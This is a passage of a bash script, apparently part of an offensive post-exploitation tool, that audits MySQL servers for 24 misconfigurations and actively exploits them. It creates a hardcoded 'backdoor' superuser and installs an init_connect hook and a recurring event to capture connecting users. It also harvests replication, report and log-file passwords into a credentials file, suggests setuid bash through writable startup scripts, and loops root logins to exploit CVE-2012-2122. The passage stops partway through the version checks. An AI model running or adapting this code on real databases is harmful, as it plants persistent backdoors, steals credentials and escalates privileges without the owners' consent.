# ═══════════════════════════════════════════════════════════════
# MYSQL MISCONFIGURATION CHECKS
# ═══════════════════════════════════════════════════════════════

check_mysql_misconfigurations() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  DEEP MYSQL MISCONFIGURATION AUDIT & EXPLOIT"
    log_exploit "  24 Checks + Active Exploitation"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== DEEP MYSQL MISCONFIGURATION AUDIT (24 CHECKS) ===" >> "$REPORT_FILE"

    local misconfig_count=0
    local total_checks=24

    # --- 1. Anonymous User Check + Exploit ---
    log_info "[Misconfig 1/$total_checks] Anonymous users..."

    local anon_users=$($mysql_cmd -N -e "SELECT User, Host FROM mysql.user WHERE User='' OR User IS NULL;" 2>/dev/null)
    if [ -n "$anon_users" ]; then
        log_critical "ANONYMOUS USERS FOUND!"
        echo "$anon_users" | while IFS=$'\t' read -r user host; do
            log_exploit "  ''@$host (anonymous login allowed!)"
        done
        echo "MISCONFIG: Anonymous users exist" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))

        if mysql -u "" -e "SELECT 1" 2>/dev/null; then
            log_critical "Anonymous login WORKS!"

            # Check what anon user can access
            local anon_grants=$(mysql -u "" -N -e "SHOW GRANTS;" 2>/dev/null)
            log_info "  Anonymous grants: $anon_grants"

            local anon_dbs=$(mysql -u "" -N -e "SHOW DATABASES;" 2>/dev/null)
            log_info "  Accessible databases: $anon_dbs"

            if echo "$anon_grants" | grep -qiE "ALL PRIVILEGES|FILE|SUPER"; then
                log_critical "  Anonymous user has FILE/SUPER/ALL! Exploiting..."
                MYSQL_CMD="mysql -u \"\""
                echo "MISCONFIG: Anonymous with high privileges" >> "$REPORT_FILE"
            fi
        fi
    else
        log_success "  No anonymous users"
    fi

    # --- 2. Remote Root Login ---
    log_info "[Misconfig 2/$total_checks] Remote root login..."

    local remote_root=$($mysql_cmd -N -e "SELECT User, Host FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost','127.0.0.1','::1');" 2>/dev/null)
    if [ -n "$remote_root" ]; then
        log_critical "REMOTE ROOT LOGIN ALLOWED!"
        echo "$remote_root" | while IFS=$'\t' read -r user host; do
            log_exploit "  root@$host"
        done
        echo "MISCONFIG: Remote root login" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))

        if echo "$remote_root" | grep -q "%"; then
            log_critical "  root@% = ROOT LOGIN FROM ANY HOST!"
        fi
    else
        log_success "  Root restricted to localhost"
    fi

    # --- 3. Test Database ---
    log_info "[Misconfig 3/$total_checks] Test database..."

    local test_db=$($mysql_cmd -N -e "SELECT SCHEMA_NAME FROM information_schema.SCHEMATA WHERE SCHEMA_NAME='test';" 2>/dev/null)
    if [ -n "$test_db" ]; then
        log_warning "TEST DATABASE EXISTS (accessible by all users)"
        echo "MISCONFIG: test database" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))

        local test_tables=$($mysql_cmd -N -e "SELECT COUNT(*) FROM information_schema.TABLES WHERE TABLE_SCHEMA='test';" 2>/dev/null)
        [ -n "$test_tables" ] && [ "$test_tables" -gt 0 ] 2>/dev/null && log_warning "  test db has $test_tables tables"
    else
        log_success "  No test database"
    fi

    # --- 4. skip-grant-tables + Active Exploit ---
    log_info "[Misconfig 4/$total_checks] skip-grant-tables..."

    local skip_grants=$($mysql_cmd -N -e "SELECT @@skip_grant_tables;" 2>/dev/null)
    if [ "$skip_grants" == "1" ] || [ "$skip_grants" == "ON" ]; then
        log_critical "skip-grant-tables IS ENABLED! ALL AUTH BYPASSED!"
        echo "MISCONFIG: skip-grant-tables ENABLED" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))

        # Exploit: we can do ANYTHING since auth is disabled
        log_exploit "  Attempting to create backdoor root user..."
        $mysql_cmd -e "CREATE USER IF NOT EXISTS 'backdoor'@'localhost' IDENTIFIED BY 'B4ckd00r!';" 2>/dev/null
        $mysql_cmd -e "GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'localhost' WITH GRANT OPTION;" 2>/dev/null
        $mysql_cmd -e "FLUSH PRIVILEGES;" 2>/dev/null

        if mysql -u backdoor -p'B4ckd00r!' -e "SELECT 1" 2>/dev/null; then
            log_exploit "  Backdoor MySQL user created: backdoor / B4ckd00r!"
            echo "EXPLOIT: backdoor MySQL user created" >> "$REPORT_FILE"
        fi
    else
        local skip_proc=$(_ps_aux | grep -E "mysqld|mariadbd" | grep -v grep | grep -i "skip-grant")
        if [ -n "$skip_proc" ]; then
            log_critical "skip-grant-tables in process arguments!"
            misconfig_count=$((misconfig_count + 1))
        else
            log_success "  skip-grant-tables not enabled"
        fi
    fi

    # --- 5. SSL/TLS ---
    log_info "[Misconfig 5/$total_checks] SSL/TLS configuration..."

    local have_ssl=$($mysql_cmd -N -e "SELECT @@have_ssl;" 2>/dev/null)
    local require_secure=$($mysql_cmd -N -e "SELECT @@require_secure_transport;" 2>/dev/null)

    if [ "$have_ssl" == "DISABLED" ] || [ "$have_ssl" == "NO" ]; then
        log_critical "SSL/TLS DISABLED! Credentials transmitted in plaintext!"
        echo "MISCONFIG: SSL disabled" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    elif [ "$require_secure" != "ON" ] && [ "$require_secure" != "1" ]; then
        log_warning "  require_secure_transport OFF (non-SSL allowed)"
        echo "MISCONFIG: require_secure_transport OFF" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    local no_ssl_count=$($mysql_cmd -N -e "SELECT COUNT(*) FROM mysql.user WHERE ssl_type='' AND User != '';" 2>/dev/null)
    [ -n "$no_ssl_count" ] && [ "$no_ssl_count" -gt 0 ] 2>/dev/null && log_warning "  $no_ssl_count users do NOT require SSL"

    # --- 6. Wildcard Grants + GRANT OPTION ---
    log_info "[Misconfig 6/$total_checks] Wildcard/permissive grants..."

    local wildcard_grants=$($mysql_cmd -N -e "SELECT User, Host FROM mysql.user WHERE Host='%' AND User != '';" 2>/dev/null)
    if [ -n "$wildcard_grants" ]; then
        log_critical "WILDCARD HOST (%) USERS:"
        echo "$wildcard_grants" | while IFS=$'\t' read -r user host; do
            local ugrants=$($mysql_cmd -N -e "SHOW GRANTS FOR '${user}'@'%';" 2>/dev/null)
            if echo "$ugrants" | grep -qiE "ALL PRIVILEGES|SUPER|FILE"; then
                log_critical "  $user@% -> HIGH PRIVILEGES"
            else
                log_warning "  $user@% (login from any host)"
            fi
        done
        echo "MISCONFIG: Wildcard host users" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    local grant_opt_users=$($mysql_cmd -N -e "SELECT User, Host FROM mysql.user WHERE Grant_priv='Y' AND User != '' AND User != 'root';" 2>/dev/null)
    if [ -n "$grant_opt_users" ]; then
        log_critical "Non-root users with GRANT OPTION:"
        echo "$grant_opt_users" | while IFS=$'\t' read -r user host; do
            log_exploit "  $user@$host can create/modify users!"
        done
        echo "MISCONFIG: Non-root GRANT OPTION" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # --- 7. Network Exposure ---
    log_info "[Misconfig 7/$total_checks] Network exposure..."

    local skip_net=$($mysql_cmd -N -e "SELECT @@skip_networking;" 2>/dev/null)
    local bind_addr=$($mysql_cmd -N -e "SELECT @@bind_address;" 2>/dev/null)
    local mysql_port=$($mysql_cmd -N -e "SELECT @@port;" 2>/dev/null)

    if [ "$skip_net" != "ON" ] && [ "$skip_net" != "1" ]; then
        if [ "$bind_addr" == "0.0.0.0" ] || [ "$bind_addr" == "*" ] || [ "$bind_addr" == "::" ]; then
            log_critical "MySQL EXPOSED on all interfaces! ($bind_addr:$mysql_port)"
            echo "MISCONFIG: MySQL exposed $bind_addr:$mysql_port" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))

            if command -v ss &>/dev/null; then
                local listen_out=$(ss -tlnp 2>/dev/null | grep ":${mysql_port}")
                [ -n "$listen_out" ] && log_warning "  Confirmed: $listen_out"
            fi
        else
            log_success "  Bound to $bind_addr (restricted)"
        fi
    else
        log_success "  skip_networking ON (TCP disabled)"
    fi

    # Also check skip_name_resolve
    local skip_resolve=$($mysql_cmd -N -e "SELECT @@skip_name_resolve;" 2>/dev/null)
    if [ "$skip_resolve" != "ON" ] && [ "$skip_resolve" != "1" ]; then
        log_warning "  skip_name_resolve OFF (DNS rebinding attacks possible)"
        echo "MISCONFIG: skip_name_resolve OFF" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # --- 8. World-Readable MySQL Files ---
    log_info "[Misconfig 8/$total_checks] File permissions..."

    local config_files=("/etc/my.cnf" "/etc/mysql/my.cnf" "/etc/mysql/mariadb.cnf"
                       "/etc/mysql/conf.d/" "/etc/mysql/mysql.conf.d/"
                       "/etc/mysql/debian.cnf" "/var/lib/mysql/")

    for cfile in "${config_files[@]}"; do
        [ ! -e "$cfile" ] && continue
        local world_read=$(stat -c "%a" "$cfile" 2>/dev/null)
        [ -z "$world_read" ] && continue

        local other_perms=${world_read: -1}
        if [ "$other_perms" -ge 4 ] 2>/dev/null; then
            local perms=$(stat -c "%a %U:%G" "$cfile" 2>/dev/null)
            log_warning "  WORLD-READABLE: $cfile ($perms)"
            echo "MISCONFIG: World-readable $cfile" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))

            if [ -f "$cfile" ]; then
                local cfg_pass=$(grep -iE "password|passwd" "$cfile" 2>/dev/null)
                if [ -n "$cfg_pass" ]; then
                    log_critical "  Passwords in world-readable $cfile!"
                    echo "$cfg_pass" | while read pl; do log_exploit "    $pl"; done
                fi
            fi
        fi
    done

    local datadir=$($mysql_cmd -N -e "SELECT @@datadir;" 2>/dev/null)
    if [ -n "$datadir" ] && [ -d "$datadir" ]; then
        local world_files=$(find "$datadir" -maxdepth 2 -perm -o+r -type f 2>/dev/null | head -10)
        if [ -n "$world_files" ]; then
            log_warning "  World-readable files in $datadir"
            misconfig_count=$((misconfig_count + 1))
        fi
    fi

    # --- 9. Password Security ---
    log_info "[Misconfig 9/$total_checks] Password security..."

    local old_passwords=$($mysql_cmd -N -e "SELECT @@old_passwords;" 2>/dev/null)
    if [ -n "$old_passwords" ] && [ "$old_passwords" != "0" ] && [ "$old_passwords" != "" ]; then
        log_critical "old_passwords=$old_passwords (WEAK hashing!)"
        echo "MISCONFIG: old_passwords=$old_passwords" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    local val_policy=$($mysql_cmd -N -e "SELECT @@validate_password_policy;" 2>/dev/null)
    local val_length=$($mysql_cmd -N -e "SELECT @@validate_password_length;" 2>/dev/null)
    if [ -z "$val_policy" ] || [ "$val_policy" == "0" ] || [ "$val_policy" == "LOW" ]; then
        log_warning "  Password validation: WEAK (policy=$val_policy, min=$val_length)"
        echo "MISCONFIG: Weak password validation" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    local empty_pass=$($mysql_cmd -N -e "
        SELECT User, Host FROM mysql.user
        WHERE (Password='' OR Password IS NULL)
        AND (authentication_string='' OR authentication_string IS NULL)
        AND User != '';" 2>/dev/null)

    if [ -n "$empty_pass" ]; then
        log_critical "USERS WITH EMPTY PASSWORDS:"
        echo "$empty_pass" | while IFS=$'\t' read -r u h; do
            log_exploit "  $u@$h (NO PASSWORD!)"

            # Exploit: try login with empty password user
            if mysql -u "$u" -e "SHOW GRANTS;" 2>/dev/null | grep -qiE "ALL|FILE|SUPER"; then
                log_critical "  $u has high privileges with NO password!"
                echo "EXPLOIT: $u@$h empty password with high privs" >> "$REPORT_FILE"
            fi
        done
        echo "MISCONFIG: Empty password users" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # --- 10. Suspicious UDFs / Symlinks / local_infile / log_raw ---
    log_info "[Misconfig 10/$total_checks] UDFs, symlinks, dangerous flags..."

    local allow_susp=$($mysql_cmd -N -e "SELECT @@allow_suspicious_udfs;" 2>/dev/null)
    if [ "$allow_susp" == "ON" ] || [ "$allow_susp" == "1" ]; then
        log_critical "allow_suspicious_udfs ENABLED!"
        echo "MISCONFIG: allow_suspicious_udfs" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    local sym_links=$($mysql_cmd -N -e "SELECT @@have_symlink;" 2>/dev/null)
    if [ "$sym_links" == "YES" ]; then
        log_warning "  Symbolic links enabled (symlink attacks possible)"
        echo "MISCONFIG: Symbolic links" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    local existing_funcs=$($mysql_cmd -N -e "SELECT name, type, dl FROM mysql.func;" 2>/dev/null)
    if [ -n "$existing_funcs" ]; then
        log_warning "Existing UDF functions (potential backdoors):"
        echo "$existing_funcs" | while IFS=$'\t' read -r fn ft fd; do
            log_warning "  $fn (type=$ft, lib=$fd)"
            echo "UDF_BACKDOOR: $fn from $fd" >> "$REPORT_FILE"
        done
        misconfig_count=$((misconfig_count + 1))
    fi

    local local_infile=$($mysql_cmd -N -e "SELECT @@local_infile;" 2>/dev/null)
    if [ "$local_infile" == "ON" ] || [ "$local_infile" == "1" ]; then
        log_warning "  local_infile ON (LOAD DATA LOCAL enabled)"
        echo "MISCONFIG: local_infile" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    local log_raw=$($mysql_cmd -N -e "SELECT @@log_raw;" 2>/dev/null)
    if [ "$log_raw" == "ON" ] || [ "$log_raw" == "1" ]; then
        log_critical "  log_raw ON (passwords in plaintext in logs!)"
        echo "MISCONFIG: log_raw" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # ═══════════════════════════════════════════
    # NEW DEEP MISCONFIGURATION CHECKS (11-24)
    # ═══════════════════════════════════════════

    # --- 11. init_connect / init_slave / init_file Injection ---
    log_info "[Misconfig 11/$total_checks] init_connect / init_slave / init_file..."

    local init_connect=$($mysql_cmd -N -e "SELECT @@init_connect;" 2>/dev/null)
    local init_slave=$($mysql_cmd -N -e "SELECT @@init_slave;" 2>/dev/null)
    local init_file=$($mysql_cmd -N -e "SELECT @@init_file;" 2>/dev/null)

    if [ -n "$init_connect" ] && [ "$init_connect" != "" ]; then
        log_critical "init_connect is SET: $init_connect"
        log_warning "  This SQL runs for EVERY new non-SUPER connection!"
        echo "MISCONFIG: init_connect=$init_connect" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    else
        # Exploit: if we have SUPER, we can SET init_connect to capture creds
        local has_super=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "SUPER|ALL PRIVILEGES")
        if [ -n "$has_super" ]; then
            log_exploit "  init_connect is empty + we have SUPER = can inject!"
            log_info "  Can set init_connect to log all connecting users' queries"

            # Create credential capture table
            $mysql_cmd -e "CREATE DATABASE IF NOT EXISTS _audit;" 2>/dev/null
            $mysql_cmd -e "CREATE TABLE IF NOT EXISTS _audit.connections (
                ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                user VARCHAR(255),
                host VARCHAR(255)
            );" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL init_connect='INSERT INTO _audit.connections(user,host) VALUES(USER(),@@hostname)';" 2>/dev/null

            if [ $? -eq 0 ]; then
                log_exploit "  init_connect backdoor INSTALLED!"
                log_info "  All new connections will be logged to _audit.connections"
                echo "EXPLOIT: init_connect credential capture installed" >> "$REPORT_FILE"
            fi
        fi
    fi

    if [ -n "$init_slave" ] && [ "$init_slave" != "" ]; then
        log_critical "init_slave is SET: $init_slave"
        log_warning "  Runs on slave SQL thread start!"
        echo "MISCONFIG: init_slave=$init_slave" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    if [ -n "$init_file" ] && [ "$init_file" != "" ]; then
        log_critical "init_file is SET: $init_file"
        log_warning "  SQL file executed at MySQL startup!"
        echo "MISCONFIG: init_file=$init_file" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))

        if [ -r "$init_file" ]; then
            log_success "  init_file is READABLE!"
            local init_content=$(cat "$init_file" 2>/dev/null | head -20)
            log_info "  Content: $init_content"
        fi

        if [ -w "$init_file" ]; then
            log_critical "  init_file is WRITABLE! Can inject SQL for next restart!"
            echo "EXPLOIT: init_file writable" >> "$REPORT_FILE"
        fi
    fi

    # --- 12. Replication Misconfiguration ---
    log_info "[Misconfig 12/$total_checks] Replication configuration..."

    local slave_status=$($mysql_cmd -e "SHOW SLAVE STATUS\G" 2>/dev/null)
    if [ -n "$slave_status" ]; then
        local master_host=$(echo "$slave_status" | grep "Master_Host" | awk '{print $2}')
        local master_user=$(echo "$slave_status" | grep "Master_User" | awk '{print $2}')
        local master_port=$(echo "$slave_status" | grep "Master_Port" | awk '{print $2}')
        local slave_io=$(echo "$slave_status" | grep "Slave_IO_Running" | awk '{print $2}')
        local slave_sql=$(echo "$slave_status" | grep "Slave_SQL_Running" | awk '{print $2}')

        log_critical "REPLICATION IS CONFIGURED!"
        log_info "  Master: $master_user@$master_host:$master_port"
        log_info "  IO: $slave_io, SQL: $slave_sql"
        echo "REPL: $master_user@$master_host:$master_port" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))

        # Try to get master password from CHANGE MASTER
        local master_info_repo=$($mysql_cmd -N -e "SELECT @@master_info_repository;" 2>/dev/null)
        if [ "$master_info_repo" == "FILE" ]; then
            local master_info_file="${datadir}/master.info"
            if [ -r "$master_info_file" ]; then
                log_critical "  master.info is READABLE!"
                local repl_pass=$(sed -n '6p' "$master_info_file" 2>/dev/null)
                if [ -n "$repl_pass" ]; then
                    log_exploit "  Replication password: $repl_pass"
                    echo "REPL_PASSWORD: $repl_pass" >> "$REPORT_FILE"
                    echo "repl_$master_user:$repl_pass:replication" >> "$CREDS_FILE"
                    FOUND_PASSWORDS["repl_$master_user"]="$repl_pass"
                fi
            fi
        elif [ "$master_info_repo" == "TABLE" ]; then
            local repl_pass=$($mysql_cmd -N -e "SELECT User_password FROM mysql.slave_master_info LIMIT 1;" 2>/dev/null)
            if [ -n "$repl_pass" ] && [ "$repl_pass" != "NULL" ]; then
                log_exploit "  Replication password from table: $repl_pass"
                echo "REPL_PASSWORD: $repl_pass" >> "$REPORT_FILE"
                echo "repl_$master_user:$repl_pass:replication" >> "$CREDS_FILE"
                FOUND_PASSWORDS["repl_$master_user"]="$repl_pass"
            fi
        fi
    fi

    local report_pass=$($mysql_cmd -N -e "SELECT @@report_password;" 2>/dev/null)
    if [ -n "$report_pass" ] && [ "$report_pass" != "" ]; then
        log_critical "report_password exposed: $report_pass"
        echo "REPORT_PASSWORD: $report_pass" >> "$REPORT_FILE"
        echo "report_user:$report_pass:report_password" >> "$CREDS_FILE"
        FOUND_PASSWORDS["_report"]="$report_pass"
        misconfig_count=$((misconfig_count + 1))
    fi

    # --- 13. Event Scheduler Abuse ---
    log_info "[Misconfig 13/$total_checks] Event scheduler..."

    local event_scheduler=$($mysql_cmd -N -e "SELECT @@event_scheduler;" 2>/dev/null)
    log_info "  event_scheduler = $event_scheduler"

    if [ "$event_scheduler" == "ON" ] || [ "$event_scheduler" == "1" ]; then
        log_warning "  Event scheduler is ON"

        # Check existing events
        local events=$($mysql_cmd -N -e "SELECT EVENT_SCHEMA, EVENT_NAME, DEFINER, STATUS FROM information_schema.EVENTS;" 2>/dev/null)
        if [ -n "$events" ]; then
            log_success "  Existing events found:"
            echo "$events" | while IFS=$'\t' read -r esch ename edef estat; do
                log_info "    $esch.$ename (definer=$edef, status=$estat)"
            done
        fi

        echo "EVENT_SCHEDULER: ON" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # Exploit: try to create persistent backdoor event
    local has_event=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "EVENT|ALL PRIVILEGES")
    if [ -n "$has_event" ]; then
        log_exploit "  We have EVENT privilege - can create persistent backdoor!"

        if [ "$event_scheduler" != "ON" ] && [ "$event_scheduler" != "1" ]; then
            $mysql_cmd -e "SET GLOBAL event_scheduler = ON;" 2>/dev/null
            if [ $? -eq 0 ]; then
                log_exploit "  Event scheduler ENABLED by us!"
            fi
        fi

        # Create backdoor event that runs every minute
        $mysql_cmd -e "CREATE DATABASE IF NOT EXISTS _audit;" 2>/dev/null
        $mysql_cmd -e "
            CREATE EVENT IF NOT EXISTS _audit.backdoor_event
            ON SCHEDULE EVERY 1 MINUTE
            DO INSERT INTO _audit.connections(user,host) VALUES(USER(), NOW());" 2>/dev/null

        if [ $? -eq 0 ]; then
            log_exploit "  Persistent event backdoor created: _audit.backdoor_event"
            echo "EXPLOIT: Persistent event backdoor" >> "$REPORT_FILE"
        fi
    fi

    # --- 14. Trigger Backdoor ---
    log_info "[Misconfig 14/$total_checks] Trigger abuse..."

    local has_trigger=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "TRIGGER|ALL PRIVILEGES")
    if [ -n "$has_trigger" ]; then
        log_warning "  We have TRIGGER privilege"

        # Check existing triggers
        local triggers=$($mysql_cmd -N -e "
            SELECT TRIGGER_SCHEMA, TRIGGER_NAME, EVENT_OBJECT_TABLE, DEFINER, ACTION_TIMING, EVENT_MANIPULATION
            FROM information_schema.TRIGGERS
            WHERE TRIGGER_SCHEMA NOT IN ('sys');" 2>/dev/null)

        if [ -n "$triggers" ]; then
            log_success "  Existing triggers found:"
            echo "$triggers" | while IFS=$'\t' read -r tsch tname ttable tdef ttime tevent; do
                log_info "    $tsch.$tname on $ttable ($ttime $tevent, definer=$tdef)"

                if echo "$tdef" | grep -q "root"; then
                    log_critical "    Trigger runs as ROOT definer!"
                    echo "TRIGGER_ROOT: $tsch.$tname definer=$tdef" >> "$REPORT_FILE"
                fi
            done
        fi

        # Find frequently-used tables to place trigger on
        local busy_tables=$($mysql_cmd -N -e "
            SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES
            WHERE TABLE_SCHEMA NOT IN ('information_schema','performance_schema','mysql','sys','_audit')
            AND TABLE_ROWS > 0
            ORDER BY UPDATE_TIME DESC LIMIT 5;" 2>/dev/null)

        if [ -n "$busy_tables" ]; then
            log_info "  Active tables (potential trigger targets):"
            echo "$busy_tables" | while IFS=$'\t' read -r bs bt; do
                log_info "    $bs.$bt"
            done
        fi

        echo "TRIGGER_PRIV: Available" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # --- 15. Stored Procedure / Function DEFINER Abuse ---
    log_info "[Misconfig 15/$total_checks] Stored procedure DEFINER abuse..."

    local root_routines=$($mysql_cmd -N -e "
        SELECT ROUTINE_SCHEMA, ROUTINE_NAME, ROUTINE_TYPE, DEFINER, SECURITY_TYPE
        FROM information_schema.ROUTINES
        WHERE DEFINER LIKE 'root@%'
        AND SECURITY_TYPE = 'DEFINER'
        AND ROUTINE_SCHEMA NOT IN ('sys','mysql');" 2>/dev/null)

    if [ -n "$root_routines" ]; then
        log_critical "Stored routines with ROOT DEFINER + DEFINER security:"
        echo "$root_routines" | while IFS=$'\t' read -r rsch rname rtype rdef rsec; do
            log_exploit "  $rsch.$rname ($rtype) -> runs as $rdef"
        done
        echo "DEFINER_ABUSE: Root-definer routines found" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))

        # Any EXECUTE privilege user can run these as root
        log_warning "  Any user with EXECUTE can run these with root privileges!"
    fi

    # Check if we can CREATE routines with SQL SECURITY DEFINER
    local has_create_routine=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "CREATE ROUTINE|ALL PRIVILEGES")
    if [ -n "$has_create_routine" ]; then
        log_exploit "  We have CREATE ROUTINE - can create DEFINER=root procedures!"
        echo "EXPLOIT: CREATE ROUTINE available" >> "$REPORT_FILE"
    fi

    # --- 16. mysqld_safe / Startup Script Writable ---
    log_info "[Misconfig 16/$total_checks] Startup scripts writable..."

    local startup_scripts=(
        "/usr/bin/mysqld_safe" "/usr/sbin/mysqld" "/usr/bin/mysqld"
        "/usr/local/mysql/bin/mysqld_safe" "/etc/init.d/mysql" "/etc/init.d/mysqld"
        "/etc/init.d/mariadb" "/usr/lib/systemd/system/mysql.service"
        "/usr/lib/systemd/system/mysqld.service" "/usr/lib/systemd/system/mariadb.service"
        "/etc/systemd/system/mysql.service" "/etc/systemd/system/mysqld.service"
        "/etc/systemd/system/mariadb.service"
    )

    for sscript in "${startup_scripts[@]}"; do
        if [ -w "$sscript" ]; then
            log_critical "WRITABLE STARTUP SCRIPT: $sscript"
            echo "MISCONFIG: Writable $sscript" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))

            log_exploit "  Can inject commands that run as root on MySQL restart!"
            log_info "  Example: Add 'chmod u+s /bin/bash' before mysqld start"
        fi
    done

    # Check mysql_upgrade writable
    local mysql_upgrade=$(which mysql_upgrade 2>/dev/null)
    if [ -n "$mysql_upgrade" ] && [ -w "$mysql_upgrade" ]; then
        log_critical "WRITABLE mysql_upgrade: $mysql_upgrade"
        echo "MISCONFIG: Writable mysql_upgrade" >> "$REPORT_FILE"
        misconfig_count=$((misconfig_count + 1))
    fi

    # --- 17. Log File Permissions ---
    log_info "[Misconfig 17/$total_checks] Log file permissions..."

    local log_files=()
    local error_log=$($mysql_cmd -N -e "SELECT @@log_error;" 2>/dev/null)
    local general_log_file=$($mysql_cmd -N -e "SELECT @@general_log_file;" 2>/dev/null)
    local slow_log_file=$($mysql_cmd -N -e "SELECT @@slow_query_log_file;" 2>/dev/null)

    [ -n "$error_log" ] && [ "$error_log" != "" ] && log_files+=("$error_log")
    [ -n "$general_log_file" ] && [ "$general_log_file" != "" ] && log_files+=("$general_log_file")
    [ -n "$slow_log_file" ] && [ "$slow_log_file" != "" ] && log_files+=("$slow_log_file")

    for lf in "${log_files[@]}"; do
        if [ -r "$lf" ]; then
            local lf_perms=$(stat -c "%a %U:%G" "$lf" 2>/dev/null)
            log_warning "  READABLE log: $lf ($lf_perms)"

            # Check for passwords in logs
            local log_creds=$(grep -iE "password|IDENTIFIED BY|SET PASSWORD|Access denied.*using password" "$lf" 2>/dev/null | tail -20)
            if [ -n "$log_creds" ]; then
                log_critical "  Credentials found in log file!"
                echo "$log_creds" | head -5 | while read lcline; do
                    log_exploit "    $lcline"
                    echo "LOG_CRED: $lcline" >> "$REPORT_FILE"
                done

                # Extract failed login passwords from error log (log_raw ON)
                local failed_passes=$(echo "$log_creds" | grep -oP "using password: YES.*|IDENTIFIED BY '[^']+'" | head -5)
                if [ -n "$failed_passes" ]; then
                    log_critical "  Password attempts visible in logs!"
                fi
            fi

            echo "MISCONFIG: Readable log $lf" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))
        fi

        if [ -w "$lf" ]; then
            log_critical "  WRITABLE log: $lf"
            log_exploit "  Can truncate or inject fake entries!"
            echo "MISCONFIG: Writable log $lf" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))
        fi
    done

    # --- 18. Plugin Directory Writable ---
    log_info "[Misconfig 18/$total_checks] Plugin directory permissions..."

    local plugin_dir=$($mysql_cmd -N -e "SELECT @@plugin_dir;" 2>/dev/null)
    if [ -n "$plugin_dir" ] && [ -d "$plugin_dir" ]; then
        local pd_perms=$(stat -c "%a %U:%G" "$plugin_dir" 2>/dev/null)
        log_info "  Plugin dir: $plugin_dir ($pd_perms)"

        if [ -w "$plugin_dir" ]; then
            log_critical "  Plugin directory is WRITABLE by current user!"
            log_exploit "  Can directly place UDF .so without FILE privilege!"
            echo "MISCONFIG: Writable plugin_dir" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))
        fi

        # Check if any .so files are writable
        local writable_so=$(find "$plugin_dir" -name "*.so" -writable 2>/dev/null)
        if [ -n "$writable_so" ]; then
            log_critical "  Writable .so files in plugin_dir:"
            echo "$writable_so" | while read wso; do
                log_exploit "    $wso (can be replaced with malicious UDF!)"
            done
            misconfig_count=$((misconfig_count + 1))
        fi
    fi

    # --- 19. MySQL Version / CVE Check ---
    log_info "[Misconfig 19/$total_checks] Version & known CVE check..."

    local version=$($mysql_cmd -N -e "SELECT @@version;" 2>/dev/null)
    local version_comment=$($mysql_cmd -N -e "SELECT @@version_comment;" 2>/dev/null)
    log_info "  Version: $version ($version_comment)"
    echo "VERSION: $version ($version_comment)" >> "$REPORT_FILE"

    if [ -n "$version" ]; then
        local major=$(echo "$version" | cut -d. -f1)
        local minor=$(echo "$version" | cut -d. -f2)
        local patch=$(echo "$version" | cut -d. -f3 | cut -d- -f1)

        # Check for known vulnerable versions
        if [ "$major" -le 4 ] 2>/dev/null; then
            log_critical "  MySQL 4.x - EXTREMELY OLD! Multiple RCE CVEs!"
            echo "CVE: MySQL 4.x critical" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))
        elif [ "$major" -eq 5 ] && [ "$minor" -le 5 ] 2>/dev/null; then
            log_critical "  MySQL 5.0-5.5 - EOL! CVE-2012-2122 (auth bypass), CVE-2016-6662"
            echo "CVE: MySQL 5.0-5.5 EOL" >> "$REPORT_FILE"
            misconfig_count=$((misconfig_count + 1))

            # CVE-2012-2122: memcmp timing attack on auth (MySQL 5.1.61, 5.5.23)
            log_info "  Testing CVE-2012-2122 (auth bypass via memcmp)..."
            local cve_count=0
            for i in $(seq 1 300); do
                if mysql -u root --password=bad -e "SELECT 1" 2>/dev/null; then
                    log_critical "  CVE-2012-2122 WORKS! Root login with wrong password!"
                    echo "CVE-2012-2122: EXPLOITABLE" >> "$REPORT_FILE"
                    MYSQL_CMD="mysql -u root"
                    cve_count=$((cve_count + 1))
                    break
                fi
            done
            [ $cve_count -eq 0 ] && log_info "  CVE-2012-2122: not vulnerable"
